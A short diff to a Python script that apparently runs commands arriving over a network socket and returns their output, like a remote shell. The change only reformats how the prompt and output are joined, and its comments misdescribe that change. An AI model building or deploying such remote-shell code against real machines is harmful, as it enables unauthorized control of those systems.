@@ -98,7 +98,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             if output.startswith(prompt):
                 output = output[len(prompt):].lstrip("\r\n")
 
-            full_output = f"{prompt}{output and '\n' + output or ''}"
+            # Only send the prompt and the actual output, don't include command
+            # Modified: Removed the command from being included in the output
+            full_output = f"{prompt}\n{output}"
 
         except subprocess.CalledProcessError as e:
             prompt = get_prompt()
@@ -106,7 +108,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             # Also remove duplicate prompt from error output start, if present
             if err_output.startswith(prompt):
                 err_output = err_output[len(prompt):].lstrip("\r\n")
-            full_output = f"{prompt}{err_output and '\n' + err_output or ''}"
+            # Modified: Removed the command from being included in the output
+            full_output = f"{prompt}\n{err_output}"
         except FileNotFoundError as e:
             prompt = get_prompt()
             full_output = f"{prompt}\n{str(e)}"
